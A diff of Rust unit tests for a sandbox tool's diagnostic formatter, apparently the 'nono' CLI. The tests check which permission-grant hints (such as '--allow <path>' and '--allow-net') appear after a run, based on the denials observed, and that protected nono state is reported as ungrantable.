+    #[test]
+    fn test_next_steps_header_omitted_without_follow_up_remediations() {
+        // Path evidence with no RunDiscovery/CheckPolicy remediation must not
+        // leave a bare "Next steps:" header behind.
+        let caps = make_test_caps();
+        let path = PathBuf::from("/test/project/out.log");
+        let diagnostics = vec![diagnostic_likely_sandbox_path(
+            path.clone(),
+            AccessMode::Write,
+            NonoRemediation::GrantPath {
+                is_file: true,
+                path,
+                access: AccessMode::Write,
+            },
+        )];
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_session_diagnostics(&diagnostics);
+        let output = formatter.format_footer(1);
+
+        assert!(output.contains("To grant additional access, re-run with:"));
+        assert!(output.contains("--allow <path>"));
+        assert!(!output.contains("Next steps:"));
+        assert!(!output.contains("Add permissions:"));
+        assert!(!output.contains("nono why --path"));
     }
 
     #[test]
@@ -3327,8 +3948,39 @@ mod tests {
         );
         assert!(output.contains("Application error:"));
         assert!(output.contains("EEXIST: file already exists"));
+        // The session observed no path at all, so no path grant or path query
+        // is prescribed; the "may be unrelated" wording is retained.
+        assert!(output.contains("The failure may be unrelated to sandbox restrictions."));
+        assert!(!output.contains("--allow <path>"));
+        assert!(!output.contains("Add permissions:"));
+        assert!(!output.contains("nono why --path"));
+        // An application error (EEXIST) names no network symptom either;
+        // the capability config blocking network is not evidence this
+        // failure was network-related (Hermes Gate finding).
+        assert!(!output.contains("To grant additional access"));
+        assert!(!output.contains("--allow-net"));
+    }
+
+    #[test]
+    fn test_supervised_no_path_evidence_network_denial_keeps_network_grant_help() {
+        let caps = make_test_caps();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_error_observation(ErrorObservation {
+                primary_verdict: None,
+                blocked_protected_file: None,
+                path_hints: Vec::new(),
+                missing_paths: Vec::new(),
+                non_sandbox_failure: None,
+                network_blocked_hint: true,
+            });
+        let output = formatter.format_footer(1);
+
+        assert!(output.contains("No path denials were observed during this session."));
+        assert!(!output.contains("--allow <path>"));
+        // A logged network-denial hint is evidence, so --allow-net stays.
         assert!(output.contains("To grant additional access, re-run with:"));
-        assert!(output.contains("Add permissions: nono run --allow <path> -- <your command>"));
+        assert!(output.contains("--allow-net"));
     }
 
     #[test]
@@ -3340,7 +3992,9 @@ mod tests {
 
         assert!(output.contains("No path denials were observed during this session."));
         assert!(output.contains("may be unrelated"));
-        assert!(output.contains("--allow <path>"));
+        assert!(!output.contains("--allow <path>"));
+        assert!(!output.contains("nono why --path"));
+        assert!(!output.contains("--allow-net"));
     }
 
     #[test]
@@ -3670,6 +4324,34 @@ mod tests {
     }
 
     #[test]
+    fn test_supervised_protected_root_parent_has_no_fix_flag() {
+        let _env_lock = ENV_LOCK.lock().expect("env lock");
+        let home = tempdir().expect("home");
+        let state = home.path().join(".local/state");
+        let _env = EnvVarGuard::set_all(&[
+            ("HOME", home.path().to_str().expect("home path")),
+            ("XDG_STATE_HOME", state.to_str().expect("state path")),
+        ]);
+        std::fs::create_dir_all(state.join("nono")).expect("state root");
+
+        let denials = vec![DenialRecord {
+            path: state.clone(),
+            access: AccessMode::ReadWrite,
+            reason: DenialReason::UserDenied,
+        }];
+        let caps = make_test_caps();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_denials(&denials);
+        let output = format_footer_with_session_report(formatter, 1);
+
+        assert!(output.contains(&state.display().to_string()));
+        assert!(output.contains("[protected nono state]"));
+        assert!(output.contains("cannot be granted or saved to a profile"));
+        assert!(!output.contains(&format!("Fix flags: --allow {}", state.display())));
+    }
+
+    #[test]
     fn test_supervised_mixed_denials() {
         let caps = make_test_caps();
         let denials = vec![
@@ -3818,9 +4500,16 @@ mod tests {
 
     #[test]
     fn test_supervised_rate_limited_denial() {
+        let _env_lock = ENV_LOCK.lock().expect("env lock");
+        let dir = tempdir().expect("fixture directory");
+        let dir_path = dir
+            .path()
+            .canonicalize()
+            .expect("canonical fixture directory");
+        let denied_path = dir_path.join("flood");
         let caps = make_test_caps();
         let denials = vec![DenialRecord {
-            path: PathBuf::from("/tmp/flood"),
+            path: denied_path.clone(),
             access: AccessMode::Read,
             reason: DenialReason::RateLimited,
         }];
@@ -3830,11 +4519,11 @@ mod tests {
         let output = format_footer_with_session_report(formatter, 1);
 
         assert!(output.contains("Sandbox denial: 1 path blocked."));
-        assert!(output.contains("/tmp/flood (read)"));
+        assert!(output.contains(&format!("{} (read)", denied_path.display())));
         // Rate-limited denials are still actionable via a path flag. The
-        // suggested target falls back to the nearest existing parent since
-        // /tmp/flood itself doesn't exist.
-        assert!(output.contains("Fix flags: --read "));
+        // missing path falls back to its private fixture directory, rather than
+        // /tmp, which may contain protected state from the environment.
+        assert!(output.contains("Fix flags: --read "), "{output}");
         assert!(!output.contains("[permanently restricted]"));
     }
 
